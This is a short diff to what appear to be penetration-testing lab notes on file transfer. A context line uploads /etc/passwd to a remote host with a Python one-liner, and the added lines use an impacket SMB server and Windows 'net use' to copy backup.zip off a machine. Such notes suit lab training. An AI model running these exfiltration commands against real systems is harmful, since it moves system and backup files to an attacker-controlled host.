@@ -98,3 +98,15 @@ Uploading a File Using a Python One-liner:
 ```bash
 Shuciran@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+
+### Upload with SMB
+On Kali Host
+```bash
+impacket-smbserver test . -smb2support -username jojomojo -password jojomojo
+```
+On Windows
+
+```bash
+net use m: \\192.168.49.147\test /user:jojomojo jojomojo
+copy backup.zip m:\
+```
